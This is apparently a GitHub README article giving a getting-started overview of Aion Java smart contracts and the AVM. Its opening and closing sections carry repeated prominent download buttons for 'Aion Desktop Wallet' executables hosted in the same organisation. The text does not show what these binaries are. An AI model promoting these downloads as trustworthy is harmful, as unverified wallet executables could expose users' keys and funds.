![Aion Wallet](assets/banner-article.png)

# Aion Java smart contract: getting started

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

Aion runs smart contracts written in Java, compiled to bytecode and executed by the Aion Virtual Machine, which is a different starting point from the Solidity and EVM tooling most chains assume.

That difference is the first thing to internalise. Java developers find the language familiar and the deployment model new; EVM developers find the opposite.

## You'll see this if

- You are evaluating Aion as a place to deploy a contract.
- You have Java experience and want to know what carries over.
- You are following an EVM tutorial and it does not apply.
- You are wondering what the AVM actually executes.

## What the AVM executes

The Aion Virtual Machine executes Java bytecode with deterministic restrictions, so contract behaviour can be reasoned about with ordinary Java tooling.

That design choice gives you the JVM's type system and ecosystem habits, and it imposes determinism: anything that would make execution depend on the machine, the clock or the network is restricted, because every node has to reach the same result.

## What carries over from Java

Types, classes, interfaces and the compiler all behave as expected. A developer who knows how to structure a Java program can structure a contract.

What does not carry over is anything non-deterministic. File access, threads, random sources and wall-clock time are not available in the way an application would use them. A contract that needs a value has to receive it as an argument or read it from chain state.

## What does not carry over from EVM

Solidity, the EVM's gas semantics, and the tooling built around them. Aion is not an EVM chain, so a contract written for Ethereum needs rewriting rather than porting.

Addresses differ as well: an Aion address is 66 characters beginning `0xa0`, as described in the [Aion address format](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-address-format-0xa0.md) guide, so anything that validates a 42-character address is wrong here.

## The development shape

1. Write the contract as a Java class with the entry points the AVM expects.
2. Compile it with the supported Java toolchain for the network's virtual machine version.
3. Deploy it from a client that speaks the Aion RPC, with a funded account for the deployment fee.
4. Record the deployed address and the transaction hash.
5. Call it and confirm the state change, rather than assuming a successful deployment implies a working contract.

The exact packaging and entry-point conventions come from the AVM's own documentation and release notes, and they change with the virtual machine version. Use the version you are actually deploying to rather than an older tutorial.

## Testing before deploying

Test on a local chain first. A local network lets you deploy, call and reset without spending real fees, and it catches the mistakes that are expensive on mainnet: a wrong entry point, a mis-sized argument, a state variable that is never initialised.

Determinism makes this easier than it sounds. The same bytecode and the same inputs produce the same result, so a passing local test is meaningful evidence.

## Upgrading and compatibility

Contracts deployed against an older virtual machine version may not be compatible with a newer one, which is why the AVM's release notes matter. The [AVM 2 and Aion contracts](https://github.com/aion-wallet/aion-explained/blob/main/aion-avm-2-contracts.md) article covers what the AVM 2 change does to existing deployments.

Read the compatibility note before deploying anything long-lived. A contract you cannot upgrade is a contract whose environment you have to choose carefully.

It also helps to know what the network itself is before writing against it, and the [what is Aion](https://github.com/aion-wallet/aion-explained/blob/main/what-is-aion.md) article covers the chain, the token and the consensus in one place.

## Prevention

Pin the virtual machine version you target, and record it with the contract address.

Keep the deployment transaction hash. It is the only durable proof of what was deployed and when.

Do not assume an EVM audit or an EVM tool covers an AVM contract. The languages and the execution model are different, and so are the failure modes.

## Accounts, fees and deployment

A deployment is a transaction, so it needs a funded account and a fee. The account is the ordinary `0xa0` address a wallet shows, and the fee is paid in AION, which is the only asset the chain charges in.

Keep the deploying account separate from the account that holds a long-term balance. A contract deployment is a development activity, and a development key in a wallet with savings is a risk that has nothing to do with the code.

Before deploying, confirm the client is on mainnet with chain ID 256, as listed in the [Aion chain ID and RPC](https://github.com/aion-wallet/aion-explained/blob/main/aion-chain-id-rpc.md) guide, and rehearse the same deployment on a local chain so the first real attempt is not the first attempt.

## Frequently asked questions

### Can I deploy a Solidity contract on Aion?

No. The AVM executes Java bytecode, so a Solidity contract has to be rewritten.

### Do I need Java installed to deploy?

You need the supported toolchain to compile, and a client with a funded account to deploy. Check the AVM documentation for the version that matches your target.

### Are gas fees the same as on Ethereum?

The network has its own fee model and its own units. Do not carry Ethereum gas assumptions across.

### Where do I find the AVM?

The virtual machine is published in the project's repositories with release notes, and the version you target should come from there.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [AVM 2 and Aion contracts](https://github.com/aion-wallet/aion-explained/blob/main/aion-avm-2-contracts.md) - the compatibility change.
- [What is Aion](https://github.com/aion-wallet/aion-explained/blob/main/what-is-aion.md) - the network the contracts run on.
- [Aion chain ID and RPC](https://github.com/aion-wallet/aion-explained/blob/main/aion-chain-id-rpc.md) - connecting a client.
- [Aion ERC-20 or mainnet](https://github.com/aion-wallet/aion-explained/blob/main/aion-erc-20-or-mainnet.md) - the token distinction developers trip over.
